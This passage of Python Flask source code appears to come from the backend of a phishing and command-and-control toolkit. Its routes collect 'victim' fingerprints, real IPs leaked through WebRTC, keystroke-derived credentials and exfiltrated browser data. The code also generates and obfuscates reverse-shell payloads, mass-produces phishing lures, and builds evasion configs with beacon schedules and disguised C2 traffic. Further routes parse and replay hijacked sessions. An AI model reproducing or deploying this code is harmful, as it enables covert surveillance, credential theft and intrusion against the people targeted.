        fp_dir = os.path.join(BASE_DIR, 'fingerprints')
        if os.path.exists(fp_dir):
            for f in os.listdir(fp_dir):
                if f.endswith('.json'):
                    with open(os.path.join(fp_dir, f), 'r') as fh:
                        data = json.load(fh)
                    basic = data.get('basic', {})
                    ip = data.get('ip', basic.get('ip', ''))
                    if ip:
                        db.save_victim_profile(
                            ip=ip,
                            fingerprint_hash=data.get('hash', ''),
                            user_agent=basic.get('userAgent', ''),
                            platform_name=basic.get('platform', ''),
                            browser=basic.get('browser', ''),
                            screen_res=f"{basic.get('screenWidth', '')}x{basic.get('screenHeight', '')}",
                        )
                        built += 1
        
        # Build from geo data
        for geo in ANALYTICS.get('geo_data', []):
            ip = geo.get('ip', '')
            if ip:
                db.save_victim_profile(
                    ip=ip,
                    lat=geo.get('lat'),
                    lon=geo.get('lng'),
                )
        
        return jsonify({'status': 'profiles_built', 'count': built})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/profiles/<int:profile_id>/tag', methods=['POST'])
def profiles_tag(profile_id):
    data = request.json
    tags = data.get('tags', [])
    db.update_victim_tags(profile_id, tags)
    return jsonify({'status': 'updated'})


@app.route('/api/profiles/<int:profile_id>/notes', methods=['POST'])
def profiles_notes(profile_id):
    data = request.json
    notes = data.get('notes', '')
    db.update_victim_notes(profile_id, notes)
    return jsonify({'status': 'updated'})


@app.route('/api/profiles/<int:profile_id>/risk', methods=['POST'])
def profiles_risk(profile_id):
    data = request.json
    score = data.get('score', 0)
    db.update_victim_risk_score(profile_id, score)
    return jsonify({'status': 'updated'})


# ===== GEOFENCE API =====

@app.route('/api/geofence/list')
def geofence_list():
    fences = db.get_geofences()
    return jsonify({'geofences': fences})


@app.route('/api/geofence/create', methods=['POST'])
def geofence_create():
    try:
        data = request.json
        fence_id = db.create_geofence(
            name=data.get('name', 'Unnamed'),
            lat=data.get('lat', 0),
            lon=data.get('lon', 0),
            radius_km=data.get('radius_km', 1.0),
            alert_type=data.get('alert_type', 'notify'),
        )
        track_event('geofence_created', {'name': data.get('name'), 'id': fence_id})
        return jsonify({'status': 'created', 'id': fence_id})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/geofence/<int:fence_id>', methods=['DELETE'])
def geofence_delete(fence_id):
    db.delete_geofence(fence_id)
    return jsonify({'status': 'deleted'})


@app.route('/api/geofence/check', methods=['POST'])
def geofence_check():
    data = request.json
    lat = data.get('lat', 0)
    lon = data.get('lon', 0)
    triggered = db.check_geofence(lat, lon)
    return jsonify({'triggered': triggered})


# ===== TELEGRAM BOT API =====

from telegram_bot import telegram_bot

@app.route('/api/telegram/config', methods=['GET', 'POST'])
def telegram_config():
    if request.method == 'POST':
        data = request.json
        telegram_bot.configure(
            token=data.get('token', ''),
            chat_id=data.get('chat_id', ''),
            alert_types=data.get('alert_types'),
        )
        return jsonify({'status': 'configured', 'config': telegram_bot.get_config()})
    return jsonify({'config': telegram_bot.get_config()})


@app.route('/api/telegram/test', methods=['POST'])
def telegram_test():
    result = telegram_bot.test_connection()
    return jsonify(result)


@app.route('/api/telegram/start_polling', methods=['POST'])
def telegram_start():
    telegram_bot.start_polling(app)
    return jsonify({'status': 'polling_started'})


@app.route('/api/telegram/stop_polling', methods=['POST'])
def telegram_stop():
    telegram_bot.stop_polling()
    return jsonify({'status': 'polling_stopped'})


# ===== WEBRTC IP LEAK ENDPOINT =====

# P3: WEBRTC_LEAKS -> moved to app.state


@app.route('/api/webrtc_leak', methods=['POST'])
def webrtc_leak():
    """Receive real IP address from WebRTC STUN leak"""
    try:
        data = request.json
        leak = {
            'real_ip': data.get('real_ip', data.get('ip', '')),
            'visible_ip': request.remote_addr,
            'user_agent': data.get('user_agent', ''),
            'platform': data.get('platform', ''),
            'timestamp': datetime.now().isoformat(),
            'vpn_detected': data.get('real_ip', '') != request.remote_addr,
        }
        WEBRTC_LEAKS.append(leak)
        if len(WEBRTC_LEAKS) > 500:
            WEBRTC_LEAKS.pop(0)
        
        # Auto-update victim profile
        if leak['real_ip']:
            db.save_victim_profile(ip=leak['real_ip'], user_agent=leak.get('user_agent', ''))
        
        track_event('webrtc_leak', leak, request.remote_addr)
        
        # Telegram alert if VPN detected
        if leak['vpn_detected']:
            telegram_bot.alert_credential('webrtc_leak', f"Real: {leak['real_ip']} | Visible: {leak['visible_ip']}", 'WebRTC STUN')
        
        return jsonify({'status': 'received'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/webrtc_leaks')
def webrtc_leaks_list():
    return jsonify({'leaks': WEBRTC_LEAKS[-100:]})


# ===== AUTO-RECON API =====

# P3: RECON_CONFIG (block) -> app.state


@app.route('/api/recon/config', methods=['GET', 'POST'])
def recon_config():
    if request.method == 'POST':
        data = request.json
        RECON_CONFIG.update(data)
        return jsonify({'status': 'updated', 'config': RECON_CONFIG})
    return jsonify({'config': RECON_CONFIG})


@app.route('/api/recon/run', methods=['POST'])
def recon_run():
    """Run full auto-recon pipeline"""
    results = {}
    
    # 1. Scan for credentials
    try:
        from credential_parser import scan_keystroke_files, scan_fingerprints, get_credential_stats
        ks_creds = scan_keystroke_files()
        fp_creds = scan_fingerprints()
        all_creds = ks_creds + fp_creds
        for cred in all_creds:
            db.save_credential(
                cred_type=cred['type'], value=cred['value'],
                source=cred.get('source', 'recon'), source_file=cred.get('file', ''),
                url=cred.get('url', ''), confidence=cred.get('confidence', 50),
            )
        results['credentials'] = len(all_creds)
    except Exception as e:
        results['credentials_error'] = str(e)
    
    # 2. Build profiles
    try:
        fp_dir = os.path.join(BASE_DIR, 'fingerprints')
        profile_count = 0
        if os.path.exists(fp_dir):
            for f in os.listdir(fp_dir):
                if f.endswith('.json'):
                    with open(os.path.join(fp_dir, f), 'r') as fh:
                        data = json.load(fh)
                    basic = data.get('basic', {})
                    ip = data.get('ip', basic.get('ip', ''))
                    if ip:
                        db.save_victim_profile(ip=ip, fingerprint_hash=data.get('hash', ''),
                            user_agent=basic.get('userAgent', ''), platform_name=basic.get('platform', ''))
                        profile_count += 1
        results['profiles'] = profile_count
    except Exception as e:
        results['profiles_error'] = str(e)
    
    # 3. Check geofences
    try:
        geo_alerts = 0
        for geo in ANALYTICS.get('geo_data', []):
            triggered = db.check_geofence(geo.get('lat', 0), geo.get('lng', 0))
            geo_alerts += len(triggered)
        results['geofence_alerts'] = geo_alerts
    except Exception as e:
        results['geofence_error'] = str(e)
    
    track_event('recon_pipeline', results)
    return jsonify({'status': 'complete', 'results': results})


# ===== OPERATOR LOG API =====

@app.route('/api/operator/log')
def operator_log():
    logs = db.get_operator_log()
    return jsonify({'logs': logs})


@app.route('/api/operator/log', methods=['POST'])
def operator_log_add():
    data = request.json
    db.log_operator_action(
        operator=session.get('IAm-logined', 'unknown'),
        action=data.get('action', ''),
        details=data.get('details', ''),
        ip=request.remote_addr,
    )
    return jsonify({'status': 'logged'})


# ========== OBFUSCATION ENGINE ==========

@app.route('/api/obfuscate', methods=['POST'])
def api_obfuscate():
    if 'IAm-logined' not in session:
        return jsonify({'error': 'Not authenticated'}), 401
    from obfuscation_engine import obfuscate_payload, get_profiles, get_supported_techniques
    data = request.json
    payload = data.get('payload', '')
    language = data.get('language', 'powershell')
    profile = data.get('profile', 'medium')
    custom = data.get('custom_techniques')
    if not payload:
        return jsonify({'error': 'No payload provided'}), 400
    result = obfuscate_payload(payload, language, profile, custom)
    db.log_operator_action(session.get('IAm-logined', 'unknown'), 'obfuscate',
                           f'Obfuscated {language} payload with {profile} profile', request.remote_addr)
    return jsonify(result)


@app.route('/api/obfuscate/profiles')
def api_obfuscate_profiles():
    if 'IAm-logined' not in session:
        return jsonify({'error': 'Not authenticated'}), 401
    from obfuscation_engine import get_profiles, get_supported_techniques
    return jsonify({
        'profiles': get_profiles(),
        'techniques': {
            lang: get_supported_techniques(lang)
            for lang in ['powershell', 'python', 'javascript', 'bash']
        }
    })


# ========== REPORT GENERATOR ==========

@app.route('/api/reports/generate', methods=['POST'])
def api_generate_report():
    if 'IAm-logined' not in session:
        return jsonify({'error': 'Not authenticated'}), 401
    from report_generator import generate_report
    data = request.json or {}
    config = {
        'title': data.get('title', 'Storm-Breaker Penetration Test Report'),
        'organization': data.get('organization', 'Security Assessment Team'),
        'target': data.get('target', 'Target Organization'),
        'author': data.get('author', session.get('IAm-logined', 'Operator')),
        'date': data.get('date', datetime.now().strftime('%Y-%m-%d')),
        'classification': data.get('classification', 'CONFIDENTIAL'),
    }
    result = generate_report(config)
    # Save to database
    report_id = db.save_report(
        name=config['title'],
        report_type=data.get('type', 'full'),
        config=config,
        html_content=result['html'],
        stats=result['stats'],
    )
    db.log_operator_action(session.get('IAm-logined', 'unknown'), 'generate_report',
                           f'Generated report: {config["title"]}', request.remote_addr)
    return jsonify({'id': report_id, 'stats': result['stats'], 'generated_at': result['generated_at']})


@app.route('/api/reports')
def api_list_reports():
    if 'IAm-logined' not in session:
        return jsonify({'error': 'Not authenticated'}), 401
    reports = db.get_reports()
    for r in reports:
        if isinstance(r.get('stats'), str):
            try:
                r['stats'] = json.loads(r['stats'])
            except Exception:
                pass
        if isinstance(r.get('config'), str):
            try:
                r['config'] = json.loads(r['config'])
            except Exception:
                pass
    return jsonify({'reports': reports})


@app.route('/api/reports/<int:report_id>')
def api_get_report(report_id):
    if 'IAm-logined' not in session:
        return jsonify({'error': 'Not authenticated'}), 401
    report = db.get_report(report_id)
    if not report:
        return jsonify({'error': 'Report not found'}), 404
    return jsonify(report)


@app.route('/api/reports/<int:report_id>/view')
def api_view_report(report_id):
    if 'IAm-logined' not in session:
        return redirect('/login')
    report = db.get_report(report_id)
    if not report:
        return 'Report not found', 404
    return Response(report['html_content'], mimetype='text/html')


@app.route('/api/reports/<int:report_id>', methods=['DELETE'])
def api_delete_report(report_id):
    if 'IAm-logined' not in session:
        return jsonify({'error': 'Not authenticated'}), 401
    db.delete_report(report_id)
    return jsonify({'status': 'deleted'})


# ========== LURE GENERATOR ==========

@app.route('/api/lures/categories')
def api_lure_categories():
    if 'IAm-logined' not in session:
        return jsonify({'error': 'Not authenticated'}), 401
    from lure_generator import get_categories
    return jsonify({'categories': get_categories()})


@app.route('/api/lures/preview', methods=['POST'])
def api_lure_preview():
    if 'IAm-logined' not in session:
        return jsonify({'error': 'Not authenticated'}), 401
    from lure_generator import preview_template
    data = request.json
    result = preview_template(data.get('category', ''), data.get('template_index', 0))
    return jsonify(result)


@app.route('/api/lures/generate', methods=['POST'])
def api_lure_generate():
    if 'IAm-logined' not in session:
        return jsonify({'error': 'Not authenticated'}), 401
    from lure_generator import generate_lure
    data = request.json
    result = generate_lure(
        category=data.get('category', ''),
        template_index=data.get('template_index', 0),
        variables=data.get('variables', {}),
        lure_type=data.get('type', 'email'),
    )
    db.log_operator_action(session.get('IAm-logined', 'unknown'), 'generate_lure',
                           f'Generated {data.get("type", "email")} lure: {data.get("category")}', request.remote_addr)
    return jsonify(result)


@app.route('/api/lures/render-html', methods=['POST'])
def api_lure_render_html():
    """Render a generated lure as a professional HTML email"""
    if 'IAm-logined' not in session:
        return jsonify({'error': 'Not authenticated'}), 401
    from lure_generator import render_html_email
    data = request.json
    html_content = render_html_email(
        subject=data.get('subject', ''),
        body=data.get('body', ''),
        variables=data.get('variables', {}),
    )
    return jsonify({'html': html_content})


@app.route('/api/lures/bulk', methods=['POST'])
def api_lure_bulk():
    if 'IAm-logined' not in session:
        return jsonify({'error': 'Not authenticated'}), 401
    from lure_generator import generate_bulk_lures
    data = request.json
    result = generate_bulk_lures(
        category=data.get('category', ''),
        template_index=data.get('template_index', 0),
        targets=data.get('targets', []),
        variables=data.get('variables', {}),
        lure_type=data.get('type', 'email'),
    )
    return jsonify(result)


@app.route('/api/lures/saved', methods=['GET'])
def api_saved_lures():
    if 'IAm-logined' not in session:
        return jsonify({'error': 'Not authenticated'}), 401
    lures = db.get_saved_lures()
    return jsonify({'lures': lures})


@app.route('/api/lures/save', methods=['POST'])
def api_save_lure():
    if 'IAm-logined' not in session:
        return jsonify({'error': 'Not authenticated'}), 401
    data = request.json
    lure_id = db.save_lure(
        name=data.get('name', 'Untitled Lure'),
        category=data.get('category', ''),
        lure_type=data.get('type', 'email'),
        subject=data.get('subject', ''),
        body=data.get('body', ''),
        variables=data.get('variables', {}),
    )
    return jsonify({'id': lure_id, 'status': 'saved'})


@app.route('/api/lures/saved/<int:lure_id>', methods=['DELETE'])
def api_delete_lure(lure_id):
    if 'IAm-logined' not in session:
        return jsonify({'error': 'Not authenticated'}), 401
    db.delete_saved_lure(lure_id)
    return jsonify({'status': 'deleted'})


# ========== BROWSER EXFILTRATION ==========

@app.route('/api/browser-exfil/receive', methods=['POST'])
def api_browser_exfil_receive():
    """Receive exfiltrated browser data from victim"""
    data = request.json or {}
    victim_ip = request.remote_addr
    session_id = data.get('session_id', '')
    data_type = data.get('type', 'unknown')
    exfil_data = data.get('data', {})
    metadata = data.get('metadata', {})
    metadata['user_agent'] = request.headers.get('User-Agent', '')
    exfil_id = db.save_browser_exfil(victim_ip, session_id, data_type, exfil_data, metadata)
    return jsonify({'status': 'received', 'id': exfil_id})


@app.route('/api/browser-exfil')
def api_browser_exfil_list():
    if 'IAm-logined' not in session:
        return jsonify({'error': 'Not authenticated'}), 401
    victim_ip = request.args.get('ip')
    data_type = request.args.get('type')
    results = db.get_browser_exfil(victim_ip, data_type)
    for r in results:
        if isinstance(r.get('data'), str):
            try:
                r['data'] = json.loads(r['data'])
            except Exception:
                pass
        if isinstance(r.get('metadata'), str):
            try:
                r['metadata'] = json.loads(r['metadata'])
            except Exception:
                pass
    return jsonify({'exfil_data': results, 'total': len(results)})


@app.route('/api/browser-exfil/stats')
def api_browser_exfil_stats():
    if 'IAm-logined' not in session:
        return jsonify({'error': 'Not authenticated'}), 401
    all_data = db.get_browser_exfil()
    stats = defaultdict(int)
    ips = set()
    for d in all_data:
        stats[d.get('data_type', 'unknown')] += 1
        ips.add(d.get('victim_ip', ''))
    return jsonify({
        'total': len(all_data),
        'by_type': dict(stats),
        'unique_victims': len(ips),
    })


# ========== NETWORK DISCOVERY ==========

@app.route('/api/network/receive', methods=['POST'])
def api_network_receive():
    """Receive network discovery data from victim-side JS scanner"""
    data = request.json or {}
    victim_ip = request.remote_addr
    scan_type = data.get('scan_type', 'webrtc')
    discovered = data.get('discovered_hosts', [])
    ports = data.get('ports', [])
    services = data.get('services', [])
    raw = data.get('raw_data', {})
    disc_id = db.save_network_discovery(victim_ip, scan_type, discovered, ports, services, raw)
    return jsonify({'status': 'received', 'id': disc_id})


@app.route('/api/network/discoveries')
def api_network_discoveries():
    if 'IAm-logined' not in session:
        return jsonify({'error': 'Not authenticated'}), 401
    victim_ip = request.args.get('ip')
    results = db.get_network_discoveries(victim_ip)
    for r in results:
        for field in ('discovered_hosts', 'ports', 'services', 'raw_data'):
            if isinstance(r.get(field), str):
                try:
                    r[field] = json.loads(r[field])
                except Exception:
                    pass
    return jsonify({'discoveries': results, 'total': len(results)})


# ========== PLAYBOOK AUTOMATION ==========

@app.route('/api/playbooks', methods=['GET'])
def api_list_playbooks():
    if 'IAm-logined' not in session:
        return jsonify({'error': 'Not authenticated'}), 401
    playbooks = db.get_playbooks()
    for pb in playbooks:
        for field in ('steps', 'variables', 'execution_log'):
            if isinstance(pb.get(field), str):
                try:
                    pb[field] = json.loads(pb[field])
                except Exception:
                    pass
    return jsonify({'playbooks': playbooks})


@app.route('/api/playbooks', methods=['POST'])
def api_create_playbook():
    if 'IAm-logined' not in session:
        return jsonify({'error': 'Not authenticated'}), 401
    data = request.json
    pb_id = db.save_playbook(
        name=data.get('name', 'Untitled Playbook'),
        description=data.get('description', ''),
        steps=data.get('steps', []),
        variables=data.get('variables', {}),
    )
    db.log_operator_action(session.get('IAm-logined', 'unknown'), 'create_playbook',
                           f'Created playbook: {data.get("name")}', request.remote_addr)
    return jsonify({'id': pb_id, 'status': 'created'})


@app.route('/api/playbooks/<int:pb_id>', methods=['GET'])
def api_get_playbook(pb_id):
    if 'IAm-logined' not in session:
        return jsonify({'error': 'Not authenticated'}), 401
    pb = db.get_playbook(pb_id)
    if not pb:
        return jsonify({'error': 'Playbook not found'}), 404
    for field in ('steps', 'variables', 'execution_log'):
        if isinstance(pb.get(field), str):
            try:
                pb[field] = json.loads(pb[field])
            except Exception:
                pass
    return jsonify(pb)


@app.route('/api/playbooks/<int:pb_id>', methods=['PUT'])
def api_update_playbook(pb_id):
    if 'IAm-logined' not in session:
        return jsonify({'error': 'Not authenticated'}), 401
    data = request.json
    db.update_playbook(pb_id, **data)
    return jsonify({'status': 'updated'})


@app.route('/api/playbooks/<int:pb_id>', methods=['DELETE'])
def api_delete_playbook(pb_id):
    if 'IAm-logined' not in session:
        return jsonify({'error': 'Not authenticated'}), 401
    db.delete_playbook(pb_id)
    return jsonify({'status': 'deleted'})


@app.route('/api/playbooks/<int:pb_id>/execute', methods=['POST'])
def api_execute_playbook(pb_id):
    """Execute a playbook's steps sequentially"""
    if 'IAm-logined' not in session:
        return jsonify({'error': 'Not authenticated'}), 401
    pb = db.get_playbook(pb_id)
    if not pb:
        return jsonify({'error': 'Playbook not found'}), 404
    steps = json.loads(pb['steps']) if isinstance(pb['steps'], str) else pb['steps']
    variables = json.loads(pb['variables']) if isinstance(pb['variables'], str) else pb['variables']
    execution_log = []
    for i, step in enumerate(steps):
        step_result = {'step': i + 1, 'action': step.get('action', ''), 'status': 'pending', 'timestamp': datetime.now().isoformat()}
        try:
            action = step.get('action', '')
            params = step.get('params', {})
            # Substitute variables in params
            for k, v in params.items():
                if isinstance(v, str):
                    for var_name, var_val in variables.items():
                        params[k] = params[k].replace(f'{{{{{var_name}}}}}', str(var_val))

            if action == 'generate_payload':
                from payload_generator import generate_payload
                result = generate_payload(params.get('type', 'ps_reverse'), params)
                step_result['output'] = result[:500] if result else 'No output'
                step_result['status'] = 'success'
            elif action == 'obfuscate':
                from obfuscation_engine import obfuscate_payload
                result = obfuscate_payload(
                    params.get('payload', ''),
                    params.get('language', 'powershell'),
                    params.get('profile', 'medium'),
                )
                step_result['output'] = str(result.get('obfuscated', ''))[:500]
                step_result['status'] = 'success'
            elif action == 'generate_lure':
                from lure_generator import generate_lure as lg_generate
                tpl_idx = params.get('template_index', 0)
                try:
                    tpl_idx = int(tpl_idx)
                except (ValueError, TypeError):
                    tpl_idx = 0
                result = lg_generate(
                    params.get('category', 'it_support'),
                    tpl_idx,
                    params.get('variables', {}),
                    params.get('type', 'email'),
                )
                step_result['output'] = result.get('body', '')[:500]
                step_result['status'] = 'success'
            elif action == 'generate_report':
                from report_generator import generate_report as rg_generate
                config = {
                    'title': params.get('title', 'Playbook Auto-Report'),
                    'organization': params.get('organization', 'Security Team'),
                    'target': params.get('target', 'Target'),
                    'author': session.get('IAm-logined', 'Operator'),
                    'date': datetime.now().strftime('%Y-%m-%d'),
                    'classification': params.get('classification', 'CONFIDENTIAL'),
                }
                result = rg_generate(config)
                report_id = db.save_report(
                    name=config['title'], report_type='full',
                    config=config, html_content=result['html'], stats=result['stats'],
                )
                step_result['output'] = f'Report #{report_id} generated — {result["stats"].get("findings", 0)} findings'
                step_result['status'] = 'success'
            elif action == 'send_telegram':
                try:
                    from telegram_bot import send_message
                    msg = params.get('message', 'Playbook notification')
                    send_message(msg)
                    step_result['output'] = f'Telegram: {msg[:200]}'
                    step_result['status'] = 'success'
                except ImportError:
                    step_result['output'] = 'Telegram bot module not configured'
                    step_result['status'] = 'skipped'
            elif action == 'export_data':
                data_type = params.get('data_type', 'credentials')
                fmt = params.get('format', 'json')
                export_data = []
                if data_type == 'credentials':
                    export_data = db.get_credentials() if hasattr(db, 'get_credentials') else []
                elif data_type == 'sessions':
                    export_data = db.get_sessions() if hasattr(db, 'get_sessions') else []
                elif data_type == 'browser_exfil':
                    export_data = db.get_browser_exfil() if hasattr(db, 'get_browser_exfil') else []
                step_result['output'] = f'Exported {len(export_data)} {data_type} records ({fmt})'
                step_result['status'] = 'success'
            elif action == 'http_request':
                import urllib.request
                import urllib.error
                url = params.get('url', '')
                method = params.get('method', 'GET').upper()
                if url:
                    req = urllib.request.Request(url, method=method)
                    try:
                        headers_str = params.get('headers', '')
                        if headers_str:
                            hdrs = json.loads(headers_str) if headers_str.strip().startswith('{') else {}
                            for hk, hv in hdrs.items():
                                req.add_header(hk, hv)
                    except Exception:
                        pass
                    resp_http = urllib.request.urlopen(req, timeout=10)
                    step_result['output'] = f'HTTP {method} {url} → {resp_http.status} ({resp_http.read(200).decode("utf-8", errors="replace")})'
                    step_result['status'] = 'success'
                else:
                    step_result['output'] = 'No URL provided'
                    step_result['status'] = 'error'
            elif action == 'conditional':
                condition = params.get('condition', 'not_empty')
                var_name = params.get('variable', '')
                expected = params.get('value', '')
                actual = variables.get(var_name, '')
                passed = False
                if condition == 'has_data':
                    passed = bool(actual)
                elif condition == 'equals':
                    passed = str(actual) == str(expected)
                elif condition == 'not_empty':
                    passed = len(str(actual).strip()) > 0
                elif condition == 'contains':
                    passed = str(expected) in str(actual)
                if passed:
                    step_result['output'] = f'Condition passed: {var_name} {condition} {expected}'
                    step_result['status'] = 'success'
                else:
                    step_result['output'] = f'Condition failed: {var_name} {condition} {expected} — stopping'
                    step_result['status'] = 'error'
                    execution_log.append(step_result)
                    break  # Stop execution on failed condition
            elif action == 'delay':
                import time as time_mod
                delay_secs = int(params.get('seconds', 1))
                time_mod.sleep(min(delay_secs, 10))  # Cap at 10s
                step_result['output'] = f'Delayed {delay_secs}s'
                step_result['status'] = 'success'
            elif action == 'log':
                msg = params.get('message', '')
                step_result['output'] = msg
                step_result['status'] = 'success'
            else:
                step_result['output'] = f'Unknown action: {action}'
                step_result['status'] = 'skipped'
        except Exception as e:
            step_result['status'] = 'error'
            step_result['output'] = str(e)
        execution_log.append(step_result)

    # Update playbook with execution results
    db.update_playbook(pb_id,
                       status='completed',
                       execution_log=execution_log,
                       last_run=datetime.now().isoformat(),
                       run_count=(pb.get('run_count', 0) or 0) + 1)
    db.log_operator_action(session.get('IAm-logined', 'unknown'), 'execute_playbook',
                           f'Executed playbook #{pb_id}: {pb.get("name")}', request.remote_addr)
    return jsonify({'status': 'executed', 'execution_log': execution_log})


# ═══════════════════════════════════════════════════════════════
# EVASION FRAMEWORK API
# ═══════════════════════════════════════════════════════════════

@app.route('/api/evasion/profiles', methods=['GET'])
def api_evasion_profiles():
    from evasion_framework import get_traffic_profiles, get_timing_profiles, get_domain_categories, get_ja3_profiles, get_decoy_patterns
    return jsonify({
        'traffic_profiles': get_traffic_profiles(),
        'timing_profiles': get_timing_profiles(),
        'domain_categories': get_domain_categories(),
        'ja3_profiles': get_ja3_profiles(),
        'decoy_patterns': get_decoy_patterns(),
    })


@app.route('/api/evasion/fingerprint', methods=['POST'])
def api_evasion_fingerprint():
    from evasion_framework import generate_spoofed_fingerprint
    data = request.get_json(force=True)
    device_class = data.get('device_class', 'desktop')
    consistency = data.get('consistency', True)
    result = generate_spoofed_fingerprint(device_class, consistency)
    track_event('evasion')
    return jsonify(result)


@app.route('/api/evasion/disguise', methods=['POST'])
def api_evasion_disguise():
    from evasion_framework import generate_disguised_request
    data = request.get_json(force=True)
    profile_key = data.get('profile', 'cdn_static')
    payload = data.get('payload', {'cmd': 'heartbeat'})
    target_url = data.get('target_url')
    result = generate_disguised_request(profile_key, payload, target_url)
    track_event('evasion')
    return jsonify(result)


@app.route('/api/evasion/beacon-schedule', methods=['POST'])
def api_evasion_beacon():
    from evasion_framework import generate_beacon_schedule
    data = request.get_json(force=True)
    profile = data.get('profile', 'office_hours')
    duration = data.get('duration_hours', 24)
    result = generate_beacon_schedule(profile, duration)
    return jsonify(result)


@app.route('/api/evasion/domains', methods=['POST'])
def api_evasion_domains():
    from evasion_framework import generate_domains
    data = request.get_json(force=True)
    category = data.get('category', 'business')
    company = data.get('company', 'AcmeCorp')
    count = data.get('count', 5)
    result = generate_domains(category, company, count)
    return jsonify(result)


@app.route('/api/evasion/decoy', methods=['POST'])
def api_evasion_decoy():
    from evasion_framework import generate_decoy_traffic
    data = request.get_json(force=True)
    pattern = data.get('pattern', 'browsing')
    duration = data.get('duration_minutes', 30)
    result = generate_decoy_traffic(pattern, duration)
    return jsonify(result)


@app.route('/api/evasion/config', methods=['POST'])
def api_evasion_config():
    from evasion_framework import build_evasion_config
    data = request.get_json(force=True)
    options = data.get('options', {})
    config = build_evasion_config(options)
    track_event('evasion')
    # Save to database
    name = data.get('name', f'Config {datetime.now().strftime("%Y%m%d_%H%M%S")}')
    db.save_evasion_config(
        name=name, config=config,
        stealth_score=config.get('overall_stealth_score', 0),
        stealth_grade=config.get('stealth_grade', 'C'),
        traffic_profile=options.get('traffic_profile', ''),
        timing_profile=options.get('timing_profile', ''),
        created_by=session.get('IAm-logined', 'unknown'))
    db.log_operator_action(session.get('IAm-logined', 'unknown'), 'evasion_config',
                           f'Built evasion config: {name}', request.remote_addr)
    return jsonify(config)


@app.route('/api/evasion/saved', methods=['GET'])
def api_evasion_saved():
    configs = db.get_evasion_configs()
    return jsonify({'configs': configs})


@app.route('/api/evasion/saved/<int:config_id>', methods=['DELETE'])
def api_evasion_delete(config_id):
    db.delete_evasion_config(config_id)
    return jsonify({'status': 'deleted'})


# ═══════════════════════════════════════════════════════════════
# THREAT INTELLIGENCE API
# ═══════════════════════════════════════════════════════════════

@app.route('/api/threat-intel/types', methods=['GET'])
def api_threat_types():
    from threat_intel import get_supported_intel_types
    return jsonify(get_supported_intel_types())


@app.route('/api/threat-intel/ip', methods=['POST'])
def api_threat_ip():
    from threat_intel import analyze_ip
    data = request.get_json(force=True)
    ip = data.get('ip', '')
    headers = data.get('headers')
    result = analyze_ip(ip, headers)
    track_event('threat_intel')
    db.save_threat_intel('ip', ip, result, result.get('threat_score', 0),
                         result.get('threat_level', 'none'),
                         session.get('IAm-logined', 'unknown'))
    return jsonify(result)


@app.route('/api/threat-intel/email', methods=['POST'])
def api_threat_email():
    from threat_intel import analyze_email
    data = request.get_json(force=True)
    email = data.get('email', '')
    result = analyze_email(email)
    track_event('threat_intel')
    db.save_threat_intel('email', email, result, result.get('intelligence_score', 0),
                         'high' if result.get('intelligence_score', 0) > 70 else 'medium',
                         session.get('IAm-logined', 'unknown'))
    return jsonify(result)


@app.route('/api/threat-intel/technology', methods=['POST'])
def api_threat_tech():
    from threat_intel import fingerprint_technology
    data = request.get_json(force=True)
    headers = data.get('headers', {})
    html_body = data.get('html_body', '')
    result = fingerprint_technology(headers, html_body)
    track_event('threat_intel')
    return jsonify(result)


@app.route('/api/threat-intel/social', methods=['POST'])
def api_threat_social():
    from threat_intel import discover_social_profiles
    data = request.get_json(force=True)
    username = data.get('username', '')
    email = data.get('email')
    result = discover_social_profiles(username, email)
    track_event('threat_intel')
    return jsonify(result)


@app.route('/api/threat-intel/report', methods=['POST'])
def api_threat_report():
    from threat_intel import build_threat_report
    data = request.get_json(force=True)
    result = build_threat_report(
        ip_address=data.get('ip'),
        email=data.get('email'),
        username=data.get('username'),
        headers=data.get('headers'),
        html_body=data.get('html_body'))
    track_event('threat_intel')
    db.save_threat_intel('full_report', json.dumps({k: data.get(k, '') for k in ('ip', 'email', 'username')}),
                         result, result.get('overall_threat_score', 0),
                         result.get('overall_threat_level', 'none'),
                         session.get('IAm-logined', 'unknown'))
    db.log_operator_action(session.get('IAm-logined', 'unknown'), 'threat_report',
                           f'Built threat report', request.remote_addr)
    return jsonify(result)


@app.route('/api/threat-intel/history', methods=['GET'])
def api_threat_history():
    intel_type = request.args.get('type')
    records = db.get_threat_intel(intel_type)
    return jsonify({'records': records})


@app.route('/api/threat-intel/<int:intel_id>', methods=['DELETE'])
def api_threat_delete(intel_id):
    db.delete_threat_intel(intel_id)
    return jsonify({'status': 'deleted'})


# ═══════════════════════════════════════════════════════════════
# SESSION HIJACKER API
# ═══════════════════════════════════════════════════════════════

@app.route('/api/session-hijack/features', methods=['GET'])
def api_hijack_features():
    from session_hijacker import get_supported_features
    return jsonify(get_supported_features())


@app.route('/api/session-hijack/parse-cookies', methods=['POST'])
def api_hijack_cookies():
    from session_hijacker import parse_cookies
    data = request.get_json(force=True)
    cookie_string = data.get('cookie_string')
    cookie_list = data.get('cookie_list')
    result = parse_cookies(cookie_string, cookie_list)
    track_event('session_hijack')
    return jsonify(result)


@app.route('/api/session-hijack/analyze-jwt', methods=['POST'])
def api_hijack_jwt():
    from session_hijacker import analyze_jwt
    data = request.get_json(force=True)
    token = data.get('token', '')
    result = analyze_jwt(token)
    track_event('session_hijack')
    return jsonify(result)


@app.route('/api/session-hijack/extract-tokens', methods=['POST'])
def api_hijack_extract():
    from session_hijacker import extract_tokens
    data = request.get_json(force=True)
    result = extract_tokens(data)
    track_event('session_hijack')
    return jsonify(result)


@app.route('/api/session-hijack/build-replay', methods=['POST'])
def api_hijack_replay():
    from session_hijacker import build_replay_request
    data = request.get_json(force=True)
    cookies = data.get('cookies', [])
    target_url = data.get('target_url', 'https://target.example.com')
    method = data.get('method', 'GET')
    result = build_replay_request(cookies, target_url, method)
    track_event('session_hijack')
    return jsonify(result)


@app.route('/api/session-hijack/assess', methods=['POST'])
def api_hijack_assess():
    from session_hijacker import assess_session
    data = request.get_json(force=True)
    cookie_data = data.get('cookies', [])
    jwt_tokens = data.get('jwt_tokens')
    result = assess_session(cookie_data, jwt_tokens)
    track_event('session_hijack')
    # Save assessment
    db.save_session_hijack(
        victim_ip=data.get('victim_ip', 'unknown'),
        session_data=result,
        token_count=result.get('token_inventory', {}).get('total', 0),
        critical_tokens=result.get('token_inventory', {}).get('auth_tokens', 0),
        hijack_feasibility=result.get('hijack_feasibility', 'unknown'),
        risk_score=result.get('risk_score', 0))
